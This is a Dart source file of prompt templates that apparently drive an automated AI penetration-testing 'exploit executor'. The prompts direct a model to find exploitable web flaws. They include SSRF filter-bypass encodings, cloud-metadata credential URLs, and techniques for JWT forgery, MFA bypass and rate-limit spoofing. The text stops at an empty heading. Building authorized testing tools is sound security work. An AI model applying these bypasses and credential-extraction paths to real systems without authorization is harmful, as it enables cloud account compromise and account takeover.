import '../models/vulnerability.dart';
import '../utils/device_utils.dart';

/// Centralized prompt templates and knowledge bases for the exploit executor.
///
/// Separates the large prompt text from orchestration logic to keep
/// exploit_executor.dart focused on its core loop.
class PromptTemplates {
  // ---------------------------------------------------------------------------
  // Specialized analysis prompts
  // ---------------------------------------------------------------------------

  /// Web-application core analysis prompt — traditional web vulnerabilities.
  /// Split from the original webAppAnalysisPrompt (Phase 11.1).
  /// Fire when HTTP/HTTPS ports are present (same condition as webAppModernPrompt).
  ///
  /// Intelligence source: HTTP/HTTPS port data, response headers, technologies array, CNAME values.
  /// Attacker objective: gain unauthorized access via injection, authentication bypass, or access control flaws.
  static String webAppCorePrompt(String deviceJson, {TargetScope scope = TargetScope.internal, bool hasSsrfParams = false}) {
    final isExternal = scope == TargetScope.external;
    final extraScope = isExternal ? _externalTargetScopeFull() : '';
    return '''
You are an expert web-application penetration tester. Analyze the device data below and identify EXPLOITABLE web-application vulnerabilities — focus on injection, authentication, access control, and CMS-specific attack surfaces.

## DEVICE DATA:
$deviceJson$extraScope

${_techFingerprintingFull()}

## SCOPE — core web attack classes:
- SQL Injection (login forms, search fields, URL params)
- XSS (reflected, stored, DOM) — see XSS section below for detail
- LFI / RFI / Path Traversal
- SSRF (internal IP access, cloud metadata) — see cloud metadata escalation chain below
- XXE (XML endpoints)
- Command Injection (any OS-interacting input)
- Authentication: test for weak or default credentials on login forms — the goal is to authenticate
  as any user; focus on credentials common to the identified CMS or framework
- IDOR / Broken Access Control
- Insecure File Upload / Webshell
- Deserialization (Java, PHP, .NET)
- CSRF: for forms with anti-CSRF tokens, the token must be fetched from the GET response before
  submitting the POST — failure to include a valid token will produce false negatives
- Post-auth attack surface: after login, enumerate all accessible pages and test every input for injection
${isExternal ? "- CMS-specific CVEs (WordPress plugins, Drupal modules, Joomla extensions)" : ""}
- Directory and path enumeration: discover endpoints not visible from the main page, focusing on
  administrative interfaces and common paths for the identified technology stack

## SSRF ESCALATION CHAIN
SSRF-capable parameters: url=, image=, webhook=, import=, fetch=, src=, proxy=, callback=, redirect=, host=, avatar=, icon=, feed=, endpoint=. Also: document conversion, PDF generation, file import, RSS fetching, image resizing.

**Cloud metadata (CRITICAL when cloud-hosted):**
Cloud IMDS endpoints (169.254.169.254, 100.100.100.200/Alibaba, fd00:ec2::254/AWS IPv6) return IAM credentials → full cloud account compromise (S3, RDS, Secrets Manager, lateral movement).
Cloud evidence: CNAME containing cloudfront/azureedge/amazonaws/azurefd/fastly/pages.dev; X-Amz-*/X-Azure-*/X-Google-* headers; SPF with cloud IP ranges.
- CRITICAL: SSRF-capable param + any cloud indicator → "SSRF to Cloud Metadata Credential Extraction"
- HIGH: SSRF-capable param without cloud indicators → internal network recon + service access

**Internal service access (non-cloud or secondary):**
SSRF probes localhost/internal services not exposed externally:
- Admin interfaces (ports 8080, 8161, 9000, 9090) — often unauthenticated internally
- Secret/config systems (ports 8200, 8500) — infrastructure credentials
- Internal APIs — may lack auth since only the app was expected to call them
- DB admin interfaces (Elasticsearch 9200, CouchDB 5984, InfluxDB 8086)

**Protocol handler escalation:** file:// (read configs/SSH keys, CRITICAL), dict:// (port scan, MEDIUM), gopher:// (Redis/Memcached/SMTP interaction, HIGH)

**DNS rebinding:** Attacker domain resolves to public IP for validation, internal IP for fetch. Evidence: hostname-based SSRF filter; "blocked: internal IP" errors. Severity: HIGH.

**Blind SSRF (OOB detection):**
When SSRF response is discarded (webhooks, async imports), use OOB platforms (Burp Collaborator, interactsh, canarytokens) to detect callbacks.
- DNS callback: MEDIUM (confirmed SSRF, chaining needed for data)
- HTTP callback: HIGH (full SSRF, escalate to IMDS/internal services)
- Blind SSRF + cloud-hosted: CRITICAL (async paths may reach IMDS)

${hasSsrfParams ? _ssrfBypassBlock() : '<!-- SSRF filter bypass techniques omitted: no SSRF-capable parameters observed in recon data -->'}

## HTTP REQUEST SMUGGLING
Generate ONLY when reverse proxy/CDN is evidenced (CDN headers, load balancer indicators, multiple server technologies).
- **CL.TE desync:** Front-end uses Content-Length, back-end uses Transfer-Encoding: chunked. Conflicting headers leave extra bytes prepended to next user's request → WAF bypass, request poisoning, internal endpoint access. Severity: HIGH.
- **TE.CL desync:** Reverse — front-end parses chunked, back-end uses CL. Same evidence/severity.
- **H2 downgrade (H2.CL, H2.TE):** HTTP/2 front-end downgrades to HTTP/1.1 for back-end — CL/TE headers may survive conversion. Severity: HIGH.

## FILE UPLOAD BYPASS
Generate when any file upload functionality is observed.
- **Extension/MIME bypass:** Double extension (name.php.jpg), case variation (.PHP), alternate extensions (phtml, phar), null byte insertion, MIME spoofing (Content-Type is client-supplied), polyglot files (valid image header + executable code)
- **Path traversal in upload destination:** Filename-derived storage path may allow writing outside intended directory
Evidence: file upload form, multipart/form-data endpoint, avatar/document/image upload.
Severity: CRITICAL when file reaches web-executable path; HIGH when execution is indirect.

## SERVER-SIDE TEMPLATE INJECTION (SSTI) (Phase 31)
Attacker objective: inject template engine directives into user-controlled input that is rendered server-side, achieving arbitrary code execution.
Generate when any user input is reflected in responses, or when a templating framework is identifiable from technology indicators.

Identify the template engine from technology fingerprints:
- Python frameworks (Flask, Django): Jinja2 is most common; also Mako, Tornado
- Java frameworks (Spring, Struts, Thymeleaf): FreeMarker, Velocity, Thymeleaf, Pebble
- PHP frameworks (Laravel, Symfony): Twig, Smarty, Blade
- Ruby frameworks (Rails, Sinatra): ERB, Haml, Liquid
- Node.js frameworks (Express, Nuxt): Handlebars, EJS, Pug, Nunjucks

Detection approach: inject a mathematical expression using each engine's expression delimiter syntax. Each engine uses distinct delimiters — the key classes are double-brace ({{...}}), dollar-brace (\${...}), and ERB-style (<%= ... %>). Submit each class and observe whether the response contains the evaluated result rather than the literal input string. A calculated result in the response confirms the template engine is evaluating user input.

Impact: SSTI in most template engines provides a path to arbitrary code execution on the server. The specific exploitation technique varies by engine and sandbox configuration — the CRITICAL finding is the confirmed template evaluation behaviour itself; execution may require additional chaining depending on the engine's sandbox restrictions.
Evidence: any input that is reflected in an HTTP response; technology indicators suggesting a template-based framework.
Severity: CRITICAL when code execution is achievable; HIGH when template context is confirmed but sandbox restricts execution.

## SECOND-ORDER INJECTION (Phase 13)
Attacker objective: exploit stored input that is later processed in a different context without sanitization.

**Second-order SQL injection:**
Malicious input containing SQL metacharacters is stored without sanitization in the first request. When a subsequent request retrieves and uses that stored value in a SQL query without parameterization, injection occurs. The injected value bypasses input validation on the second request because it comes from the database, not the user.
Generate when: any data storage with later retrieval is observable — user profiles, order records, saved searches, log entries, username fields used in subsequent queries.
Severity: HIGH to CRITICAL depending on database access level.

**Stored XSS via indirect injection:**
XSS payload stored in a user-controlled field (username, profile bio, comment) that is later rendered in an administrative interface without output encoding — targeting admin accounts rather than regular users.
Evidence: user-supplied fields that appear in any rendered output; presence of admin panel or moderation interface.
Severity: HIGH — stored XSS in admin context yields admin account compromise.

**Second-order command injection:**
Stored shell metacharacters that are later used in a system command — common in log processing scripts, report generation, backup operations, and filename handling.
Evidence: any data that might feed into server-side shell operations (filename fields, username/hostname fields used in system calls, export/report functionality).
Severity: CRITICAL — OS command execution.

**Template injection via stored content:**
Stored content rendered through a template engine at a later point — report generation, email templates, PDF generation with user-supplied content.
Evidence: any feature that generates documents, emails, or reports from user-supplied data; template engine indicators in technology stack.
Severity: CRITICAL when code execution is achievable.

Testing methodology: the attack surface exists wherever user input is stored in one request and later retrieved and processed in a different context. Common locations: username/display name fields used in admin panels, file metadata processed by server scripts, log entries fed into analysis pipelines.

## RULES:
- Only include findings for HTTP/HTTPS ports
- ONLY generate a finding if the recon data contains direct evidence that the attack surface exists:
  • Authentication attacks: only if a login form, admin panel, or auth prompt was observed
  • SQL injection: only if a login form, search field, or URL parameter was seen in the recon data
  • XSS: only if user-supplied input fields or reflected content was observed
  • Directory enumeration: only if the port returned HTTP 200 content (not a WAF block or redirect)
  • CMS-specific attacks: if the CMS was identified from ANY fingerprint signal (CNAME, header, cookie, technology array)
- Do NOT generate DoS findings against third-party infrastructure the client does not control
- Do NOT generate findings for attack surfaces that were not observed — an open port alone is NOT evidence
- If a WAF/CDN is detected: still generate application-layer findings if evidence supports them
- Each attack class is a SEPARATE entry — never group SQLi + XSS together
- Description MUST include: URL path, HTTP method, parameter name, and the attacker's goal
- Assign LOW confidence to any finding where evidence is indirect or inferred

''';
  }

  // ---------------------------------------------------------------------------
  // Shared prompt blocks — extracted to eliminate duplication across web prompts
  // ---------------------------------------------------------------------------

  /// Full technology fingerprinting block for the primary web prompt.
  static String _techFingerprintingFull() => '''
## MANDATORY: TECHNOLOGY FINGERPRINTING (do this first)
Before analyzing attack surface, identify the CMS, hosting platform, and technology stack from ALL available signals:

### CMS/Platform identification — check in this order:
1. CNAME records in dns_findings or domain_information:
   - Contains "wpenginepowered.com" or "wpengine.com" → WordPress on WPEngine
   - Contains "wordpress.com" → WordPress.com
   - Contains "sites.google.com" → Google Sites
   - Contains "myshopify.com" → Shopify
   - Contains "squarespace.com" → Squarespace
   - Contains "netlify.app" or "netlify.com" → Netlify-hosted site
   - Contains "github.io" → GitHub Pages
2. HTTP response headers: X-Powered-By, Server, X-Generator, X-Drupal-Cache, X-WordPress-*
3. Cookie names: wordpress_*, PHPSESSID+wp-*, laravel_session, XSRF-TOKEN (Laravel)
4. "technologies" array in device data — use every entry listed
5. HTTP response body signatures visible in recon: wp-content, wp-admin, Joomla!, Drupal

### Once CMS/platform is identified:
- Scope findings to that CMS's known attack surface (auth endpoints, plugin/theme vulnerabilities,
  REST APIs, XML-RPC for WordPress, admin paths, backup file locations)
- If a CMS is detected but cannot be 100% confirmed, still generate findings at LOW confidence for
  the most common attack paths — a missed finding is worse than a low-confidence finding
- WordPress on WPEngine: generate findings for /wp-login.php brute force, /wp-json/wp/v2/ REST API
  enumeration, XML-RPC (xmlrpc.php) credential attack, and plugin/theme CVE categories''';

  /// Compact fingerprinting block for secondary web prompts (API, logic/headers).
  static String _techFingerprintingCompact() => '''
## MANDATORY: TECHNOLOGY FINGERPRINTING (do this first)
Identify the platform and technology stack from ALL available signals before analyzing attack surface:
1. CNAME records: wpenginepowered.com → WordPress/WPEngine; myshopify.com → Shopify; squarespace.com → Squarespace; netlify.app → Netlify; github.io → GitHub Pages
2. HTTP response headers: X-Powered-By, Server, X-Generator, X-Drupal-Cache, X-WordPress-*
3. Cookie names: wordpress_*, laravel_session, XSRF-TOKEN (Laravel)
4. "technologies" array in device data — use every entry listed
5. HTTP response body signatures: wp-content, wp-admin, Joomla!, Drupal''';

  /// Full external target context for the primary web prompt.
  static String _externalTargetScopeFull() => '''

## EXTERNAL TARGET CONTEXT:
- WAF/CDN may be present — note any WAF-related headers (cf-ray, x-sucuri, x-cache)
- If a WAF/CDN (Cloudflare, Akamai, etc.) is detected:
  • Application-layer attacks (XSS, CSRF, SQLi, auth bypass, IDOR, logic flaws) are fully testable
    through the CDN — Cloudflare proxies HTTP/HTTPS traffic to the origin. Generate these findings
    whenever evidence for the attack surface exists, exactly as you would without a WAF.
  • ALSO generate ONE additional finding: "WAF/CDN Origin IP Not Yet Discovered" — noting that
    direct server-level exploitation (CVE RCE, buffer overflows against specific server software)
    requires the real origin IP, and describing origin IP discovery methods.
  • If the origin IP IS known, additionally generate server-software CVE findings against that IP.
- Do NOT generate SMB/RDP/internal-network findings for this target
- Do NOT generate DoS findings against third-party infrastructure (CDNs, cloud providers, email
  gateways) that the target organization does not own or control — these are not actionable''';

  /// Compact external target context for secondary web prompts.
  static String _externalTargetScopeCompact() => '''

## EXTERNAL TARGET CONTEXT:
- WAF/CDN may be present — note any WAF-related headers (cf-ray, x-sucuri, x-cache)
- If a WAF/CDN is detected: application-layer attacks are fully testable through the CDN — generate findings whenever evidence exists
- Do NOT generate DoS findings against third-party infrastructure the client does not control''';

  /// SSRF filter bypass techniques block — conditionally injected into
  /// [webAppCorePrompt] when SSRF-capable parameters are detected in recon.
  /// Kept as a separate helper to avoid bloating every web prompt unconditionally.
  static String _ssrfBypassBlock() => '''
## SSRF FILTER BYPASS TECHNIQUES (Phase 12)
When SSRF-capable parameters are identified but the server appears to filter internal IP addresses, the following bypass techniques may circumvent the filter:

**IP address representation alternatives:**
- Decimal notation: 2130706433 = 127.0.0.1; 3232235777 = 192.168.1.1
- Octal notation: 0177.0.0.1 = 127.0.0.1
- Hex notation: 0x7f000001 = 127.0.0.1
- IPv6 loopback: ::1, [::1], [::ffff:127.0.0.1]
- IPv6-mapped IPv4: ::ffff:7f00:1

**DNS-based filter bypass:**
- Register an attacker-controlled domain whose A record resolves to an internal IP — bypasses hostname-based filtering that allows external domains
- DNS rebinding: resolves to external IP for validation, internal IP for the actual fetch

**Redirect chain bypass:**
If the server follows redirects, point the initial URL to an attacker-controlled server that returns a 301 redirect to http://169.254.169.254/... — the redirect destination may not be validated against the same IP filter as the original URL.

**URL encoding and embedding:**
- URL encoding of IP octets: http://169.254.169.254 → http://169%2e254%2e169%2e254
- Embedding credentials: http://attacker@169.254.169.254/ — some parsers use the host after @
- Path-based bypass: http://169.254.169.254/latest/meta-data/ may pass where the bare IP is blocked

**Cloud-specific IMDS URL variations:**
- AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/ (GET only, no token required)
- AWS IMDSv2: requires PUT to http://169.254.169.254/latest/api/token first to get a token — SSRF that only supports GET cannot use IMDSv2
- GCP: http://metadata.google.internal/computeMetadata/v1/ with Metadata: true header required
- Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 with Metadata: true header''';

  // ---------------------------------------------------------------------------
  // Phase 13.1 — webAppModernPrompt() split into two focused prompts
  // ---------------------------------------------------------------------------

  /// API surface and authentication protocol attack analysis.
  /// Covers: CORS, GraphQL, JWT, REST API authorization, OAuth 2.0, WebSocket, Prototype Pollution.
  /// Fire when HTTP/HTTPS ports are present (same condition as webAppCorePrompt).
  static String webAppApiAuthPrompt(String deviceJson, {TargetScope scope = TargetScope.internal, bool hasGraphql = false, bool hasSsrfParams = false}) {
    final isExternal = scope == TargetScope.external;
    final extraScope = isExternal ? _externalTargetScopeCompact() : '';
    final graphqlContext = hasGraphql ? '''

## GRAPHQL CONFIRMED:
GraphQL endpoint indicators were detected in the recon data. Treat GraphQL findings as MEDIUM confidence minimum — the attack surface is confirmed present. Prioritize: schema enumeration via introspection and field suggestions, alias-based batching on authentication mutations, and field-level authorization testing.''' : '';
    final apiSsrfBypassBlock = hasSsrfParams ? '''

### SSRF via API Endpoints — Filter Bypass Techniques
Apply the same SSRF bypass techniques (IP notation alternatives, DNS rebinding, redirect chains, URL encoding, credential embedding) to API parameters: webhook_url, callback, import, fetch, proxy, redirect, OAuth redirect_uri.
Severity: CRITICAL when cloud metadata is reachable; HIGH for internal service access''' : '';
    return '''
You are an expert web-application penetration tester. Analyze the device data below and identify EXPLOITABLE vulnerabilities in API surfaces and authentication protocols.

## DEVICE DATA:
$deviceJson$extraScope$graphqlContext

${_techFingerprintingCompact()}

## SCOPE — API and authentication protocol attack classes:

### CORS Misconfiguration
Attacker objective: make cross-origin requests with the victim's credentials by exploiting a server that reflects arbitrary Origin headers.
Generate a finding if any of these conditions apply:
- Server reflects an arbitrary `Origin` header back in `Access-Control-Allow-Origin`
- `Access-Control-Allow-Origin: null` combined with `Access-Control-Allow-Credentials: true`
- Wildcard origin (`*`) combined with `Access-Control-Allow-Credentials: true`
- Subdomain wildcard (e.g. `*.example.com`) — any compromised subdomain can steal credentials
Evidence to look for: CORS headers in recon response data, authenticated API endpoints, cookie-based authentication
Severity: HIGH if credentials are included; MEDIUM otherwise

### GraphQL Security
Attacker objective: enumerate the full API schema, bypass rate limiting, exhaust server resources, and exploit authorization flaws specific to the GraphQL execution model.
Generate when `/graphql`, `/api/graphql`, `/v1/graphql`, or GraphQL indicators are present in recon data, technologies array, or response headers:
- Introspection enabled in production: reveals all types, fields, queries, mutations, and their argument types — enables complete attack surface mapping without guessing. Even when introspection is disabled, field suggestion responses ("Did you mean X?") on misspelled fields progressively reveal the schema. Severity: MEDIUM (information exposure enabling further attacks).
- Field suggestion schema reconstruction: when introspection is disabled, GraphQL servers often still return "Did you mean [fieldname]?" error messages for misspelled fields. An attacker can progressively enumerate the full schema by submitting random field names and harvesting suggestions. Evidence: GraphQL endpoint present with introspection returning errors. Severity: MEDIUM.
- Alias-based query batching for rate limit bypass: GraphQL allows sending multiple queries in a single HTTP request using field aliases. If rate limiting is applied per-HTTP-request rather than per-operation, an attacker can test thousands of credential combinations or probe authorization in a single request. Example attack surface: login or verification mutation. Evidence: mutation endpoints present; no per-operation rate limiting observed. Severity: HIGH when targeting authentication mutations.
- Deeply nested query resource exhaustion: without query depth or complexity limits, an attacker constructs a query with exponentially nested relational fields (users → posts → comments → users → posts...) causing the server to perform an exponentially large number of database operations per request. Evidence: relational data types visible in schema; no depth limiting error observed. Severity: HIGH (denial of service without authentication).
- Batch mutation abuse: multiple mutations in a single request can bulk-test credentials, bulk-create accounts, or probe authorization decisions in parallel. Evidence: mutation operations present in schema.
- Field-level authorization inconsistency: different fields on the same type may enforce different authorization levels. A user who can query a `users` type may be able to request sensitive fields (email, passwordHash, internalNotes) that should be restricted. Test individual field access after establishing any authenticated session. Evidence: schema fields with security-sensitive names visible in introspection or suggestions. Severity: HIGH to CRITICAL depending on field sensitivity.

### JWT Security
Attacker objective: forge authentication tokens without the signing key.
Generate when JWT tokens are visible in response headers, cookies, or response bodies:
- Algorithm confusion (asymmetric → HMAC): if server uses RS256, attacker may forge tokens using the public key as HMAC secret
- Algorithm "none" acceptance: unsigned tokens accepted
- Weak HMAC secret: HS256 JWTs with common secrets are offline-crackable
- `kid` parameter injection: path traversal or SQL injection to control key selection
- `jku`/`x5u` header injection: attacker-controlled URL to serve a forged key
Evidence: JWT format in cookies or Authorization headers (three dot-separated Base64 segments)

### REST API Authorization
Attacker objective: access or modify resources belonging to other users or with higher privilege.
Generate when `/api/`, `/v1/`, `/v2/`, or JSON Content-Type is detected:
- BOLA/IDOR: object-level authorization bypass — changing numeric IDs in API paths accesses other users' data
- BFLA: function-level authorization bypass — accessing admin endpoints without admin role
- Mass assignment: unexpected privileged fields (role, isAdmin, credits) accepted in POST/PUT bodies
- API version downgrade: older version endpoints (`/v1/`) may lack authentication added to newer versions
Evidence: API path patterns, numeric IDs in URLs, JSON content type in recon

### OAuth 2.0 Misconfigurations
Attacker objective: account takeover or authorization code theft.
Generate when OAuth authorization infrastructure is observed:
- Open redirect_uri: not strictly validated against a registered allowlist — HIGH severity
- Missing or predictable state parameter: CSRF-based account takeover — HIGH severity
- Authorization codes or tokens visible in URL parameters in recon data — MEDIUM severity
- Implicit flow token leakage: tokens returned in URL fragments expose tokens in browser history and Referer headers — MEDIUM severity (implicit flow deprecated in OAuth 2.1 precisely because of this)
- PKCE downgrade: if the authorization server accepts requests without a code_challenge parameter when PKCE is optional rather than required, or accepts plain code_challenge_method instead of enforcing S256, PKCE provides no protection — HIGH severity
- Authorization code reuse: codes should be single-use and short-lived; if the token endpoint accepts the same code twice, interception and delayed replay attacks are viable — HIGH severity
- Scope escalation: test whether the authorization server accepts undocumented or elevated scope values not listed in the discovery document — administrative scope acceptance is CRITICAL
- Token audience bypass: if a token issued for one resource server (audience) is accepted by a different resource server without audience validation, lateral movement between services is possible using a single compromised token — HIGH severity
Evidence: /oauth/, /auth/, /authorize, /callback paths; code= or token= parameters; "Login with [Provider]" functionality; /.well-known/openid-configuration endpoint

### Multi-Factor Authentication (MFA/2FA) Bypass
Attacker objective: authenticate with only the first factor by bypassing or circumventing the second authentication step.
Generate when login functionality, account management endpoints, or authentication flows are present:
- Direct endpoint access bypass: test whether post-authentication application pages are accessible after completing only the first factor. Some applications enforce 2FA only at the login redirect, not at each protected resource. Evidence: a session cookie is issued after username/password but before MFA completion — attempt to use that partial session to access protected endpoints directly.
- OTP/TOTP brute force window: time-based one-time codes are valid for a short window (typically 30 seconds). Applications without rate limiting or lockout on the OTP entry step allow rapid sequential submission of all possible values within the window. Evidence: TOTP entry form present; no lockout observed after repeated failures. Severity: HIGH.
- MFA fatigue (push notification abuse): applications using push-to-approve MFA are vulnerable to sustained notification flooding — the attacker authenticates with valid credentials repeatedly, generating approval requests until the user accepts one to stop the notifications. Evidence: push-based MFA identified from login UI text or authentication provider indicators. Severity: HIGH when valid credentials are available.
- Recovery code / backup code exposure: recovery codes are often accessible via account settings pages, exportable as files, or recoverable via email. Applications that generate codes with weak entropy or store them accessibly create a bypass path. Evidence: account settings or security settings pages accessible in recon. Severity: HIGH.
- "Remember this device" token abuse: applications that skip MFA for recognized devices store a device token in a cookie or localStorage. If this token is not bound to user agent or IP, it can be extracted from one session and replayed in another. Evidence: "remember this device" checkbox on MFA entry page; persistent cookie with extended expiry set after MFA completion. Severity: MEDIUM.
- MFA step skipping via parameter manipulation: some applications implement MFA as a sequential step tracked by a session variable or request parameter. Test whether the MFA step can be skipped by manipulating the step indicator in the request or directly accessing the post-MFA destination URL. Evidence: multi-step login flow with observable state tracking in requests or URL parameters. Severity: CRITICAL if bypassed.
- SMS/email OTP architectural risk: SMS-based OTP is dependent on carrier security and is vulnerable to SIM swapping and SS7 interception. Email-based OTP is as secure as the email account. Document as a MEDIUM severity architectural finding when either method is the only 2FA option — no active testing required.

### postMessage Cross-Origin Communication Abuse
Attacker objective: exploit missing or insufficient origin validation on `window.postMessage` handlers to inject data into a trusted frame, steal sensitive data from a cross-origin iframe, or execute arbitrary JavaScript.
Generate ONLY when JavaScript application indicators are present (SPA frameworks, client-side routing, iframe embeds, or `postMessage` references in captured JS content):
- Missing origin validation: a `window.addEventListener('message', handler)` that processes the event without checking `event.origin` against a whitelist accepts messages from any origin — an attacker-controlled page can `postMessage` arbitrary payloads to the target window. If the handler passes message data to `eval()`, `innerHTML`, `document.write()`, or a navigation function, XSS or open redirect results. Severity: HIGH when combined with a dangerous sink; MEDIUM for data exfiltration paths.
- Overly broad origin check: `event.origin.includes('example.com')` can be bypassed with `evil-example.com` — string containment is not a safe origin check. Severity: HIGH.
- Sensitive data broadcast without origin restriction: `window.parent.postMessage(sensitiveData, '*')` sends sensitive data (tokens, PII, session state) to any listening frame — an attacker-controlled iframe embedded via clickjacking or an open redirect can receive it. Evidence: `postMessage` calls with `'*'` as the target origin in captured JavaScript. Severity: HIGH when the data includes authentication material.
- iframe sandbox escape via postMessage: if a sandboxed iframe can send messages to its parent and the parent processes those messages without origin validation, the sandbox is effectively bypassed for the specific actions the parent performs. Evidence: sandboxed iframes present in page structure; postMessage usage observed. Severity: MEDIUM.
Evidence: `postMessage`, `addEventListener('message'`, iframe embeds, SPA framework usage, or `window.parent` references in JavaScript source.

### WebSocket Security
Attacker objective: hijack authenticated WebSocket sessions or inject through message channels.
Generate ONLY when WebSocket indicators are present:
- Required evidence: Upgrade: websocket response header, ws:// or wss:// references in recon data
- Cross-Site WebSocket Hijacking (CSWSH): missing Origin header validation — HIGH severity
- Injection through WebSocket message content: SQLi, XSS, command injection via the WebSocket channel
- Authentication bypass on WebSocket endpoints — MEDIUM severity

### API Rate Limiting Bypass
Attacker objective: circumvent per-IP or per-account rate limiting on sensitive endpoints to enable unlimited credential testing, OTP brute forcing, or enumeration.
Generate when API endpoints, authentication endpoints, or any rate-sensitive functionality is present:
- IP-based rate limiting bypass via header spoofing: many applications trust client-supplied headers to determine the originating IP for rate limiting. If the application reads `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `X-Client-IP`, or `CF-Connecting-IP` without validation, setting a different value on each request bypasses per-IP limits entirely. Evidence: any of these headers present in response data or accepted by the server; rate-limited behavior observed on repeated requests. Severity: HIGH when the protected endpoint is authentication or OTP entry (enables unlimited credential testing).
- Account-level rate limiting bypass via target rotation: if rate limiting is applied per-username rather than per-source-IP, cycling through multiple target accounts avoids triggering per-account lockout while still testing passwords at high volume. Evidence: lockout behavior appears per-username; multiple valid usernames are enumerable. Severity: HIGH.
- Endpoint-level rate limiting inconsistency: rate limiting on the primary authentication endpoint is often not applied consistently to equivalent endpoints — API token generation, password reset submission, legacy API version paths, or mobile API endpoints may perform the same operation without the same rate limit. Evidence: multiple authentication-capable endpoints present; API versioning observed. Severity: HIGH.
- Token refresh rate limit absence: OAuth 2.0 and JWT refresh token endpoints are frequently unprotected by rate limiting. An attacker with a single valid refresh token can generate a large volume of short-lived access tokens, enabling high-rate authenticated requests that bypass per-identity limits on the primary endpoint. Evidence: OAuth 2.0 or JWT refresh flow in use. Severity: MEDIUM.
Evidence to look for: rate limiting response headers (X-RateLimit-*, Retry-After), authentication endpoints, OTP submission forms, any endpoint that accepts credentials or codes.

### Prototype Pollution
Attacker objective: modify the shared JavaScript object prototype to bypass authorization or achieve code execution.
Generate ONLY when Node.js or JavaScript application evidence is present:
- Required evidence: X-Powered-By: Express or Node.js, Node.js version in headers, JSON POST/PUT endpoints accepting nested objects
- Inject `__proto__`, `constructor`, or `prototype` keys into object merge operations
- Severity: MEDIUM for authorization bypass; HIGH/CRITICAL if code execution path exists

### IDOR — Systematic Object Reference Testing (Phase 31)
Attacker objective: access or modify resources belonging to other users by substituting object identifiers in requests.
Generate when any API or web endpoint references objects via user-controlled identifiers.

Systematic IDOR testing methodology:
1. Identify all endpoints and parameters that reference server-side objects — numeric IDs, UUIDs, usernames, email addresses, file names, and any parameter whose value appears to identify a specific record
2. Horizontal privilege escalation: authenticate as User A, collect object identifiers for User A's resources, then attempt to access those same identifiers via a session authenticated as User B — any success is a confirmed IDOR
3. Vertical privilege escalation: attempt to access admin-only object identifiers (commonly low integers: 1, 2, 3 for admin accounts; admin-prefixed keys) from a standard user session
4. REST API path parameters vs query parameters: test both `/api/resource/123` path segments and `?id=123` query parameters — authorization checks are often applied inconsistently across the two styles
5. HTTP method variation: a resource that enforces authorization on GET may not enforce it on PUT, PATCH, or DELETE for the same path

Evidence: any API or web endpoint with numeric IDs, UUIDs, or predictable object keys in URLs, parameters, or JSON bodies; multiple user accounts testable in the environment.
Severity: CRITICAL when admin objects are accessible; HIGH when other users' sensitive data is accessible; MEDIUM when read access to another user's non-sensitive data is confirmed.

### Race Condition / TOCTOU (Phase 31)
Attacker objective: exploit the time gap between a server-side check and the corresponding action to perform an operation more times than the server would normally permit.
Generate when any functionality enforces a numeric limit, consumes a single-use resource, or validates state before performing an action.

Race condition testing methodology:
Submit multiple identical requests with the same authentication state simultaneously — the goal is for each request to pass the check before any of them has completed the action. The successful exploit is evidenced by the action being performed more times than the enforced limit permits.

High-value race condition targets (generate findings for any of these observed in recon):
- One-time coupon, discount, or gift card redemption: concurrent redemption requests with the same code
- Account balance deduction before transfer/purchase: concurrent transfer requests exceeding balance
- Single-use token consumption (email verification, password reset): concurrent use of the same token
- Rate-limited or one-per-account registration: concurrent account creation with the same identifier
- Voting or rating systems: concurrent votes to exceed per-user limit

Evidence: any functionality involving limits, quotas, single-use tokens, or state transitions; financial or inventory operations; authentication flows with single-use codes.
Severity: CRITICAL for financial double-spend or authentication bypass; HIGH for coupon/credit abuse; MEDIUM for rate limit or count bypass.

$apiSsrfBypassBlock

## RULES:
- Only include findings for HTTP/HTTPS ports
- API attacks: only if an API path, JSON content type, or API-related header was found during recon
- CORS: only if CORS response headers were captured, or an authenticated API is present
- MFA bypass: generate when login functionality is present — these are HIGH value findings on any modern application; rate the step-skipping and OTP brute force findings LOW confidence if no login form was observed, MEDIUM if login was observed
- Rate limiting bypass: generate when any authentication, OTP, or sensitive API endpoint is present — IP header spoofing bypass is LOW confidence without confirmed rate limiting evidence, MEDIUM when rate limit headers are observed
- WebSocket: only if Upgrade: websocket or ws:// references were observed
- Prototype Pollution: only if Node.js/Express indicators are present
- Do NOT generate DoS findings against third-party infrastructure the client does not control
- Each vulnerability class is a SEPARATE entry
- Description MUST include: URL path, HTTP method, parameter name, and the attacker's goal

''';
  }

  /// Business logic, state, and HTTP-level attack analysis.
  /// Covers: Business logic/race conditions, SSTI, Host Header Injection, HTTP Request Smuggling,
  /// Open Redirects, CRLF Injection, HTTP Security Headers, Cookie Security Attributes.
  /// Fire when HTTP/HTTPS ports are present (same condition as webAppCorePrompt).
  static String webAppLogicHeadersPrompt(String deviceJson, {TargetScope scope = TargetScope.internal, bool hasOAuth = false}) {
    final isExternal = scope == TargetScope.external;
    final oauthBoost = hasOAuth ? '''

## OAUTH/OIDC SURFACE DETECTED:
OAuth/OpenID Connect indicators are present. Prioritize and expand coverage of:
- Authorization code interception (missing PKCE, predictable state parameter)
- Token leakage via Referer headers, open redirects in redirect_uri, or fragment-based token exposure
- JWT signature bypass (alg:none, weak secret, kid injection)
- Implicit flow misuse, token substitution attacks, and cross-client token reuse
- SSRF via redirect_uri or token endpoint abuse
''' : '';
    final extraScope = isExternal ? _externalTargetScopeCompact() : '';
    return '''
You are an expert web-application penetration tester. Analyze the device data below and identify EXPLOITABLE vulnerabilities in business logic, application state, and HTTP-level attack surfaces.

## DEVICE DATA:
$deviceJson$extraScope$oauthBoost

${_techFingerprintingCompact()}

## SCOPE — business logic, state, and HTTP-level attack classes:

### Business Logic and Race Conditions
Attacker objective: exploit the application's intended flow for unintended gain.
Generate findings when the application's purpose suggests these attack surfaces:
- **Race conditions**: parallel requests to exploit time-of-check/time-of-use gaps in any state-modifying operation. High-value targets: coupon redemption, balance modification, inventory reservation, purchase finalization
- **Price/value manipulation**: negative quantities, zero-price items, integer overflow in monetary fields — applicable to any application handling money or credits
- **Workflow bypass**: skipping required steps (payment verification, email confirmation, approval workflows) by directly accessing later-stage endpoints
- **Coupon/discount abuse**: stacking single-use coupons, re-using after invalidation, negative discount values
- **Privilege parameter manipulation**: if role or permission is sent in the request body, test by modifying it
Evidence: infer application purpose from URL paths, page titles, form field names, and response content

### Server-Side Template Injection (SSTI)
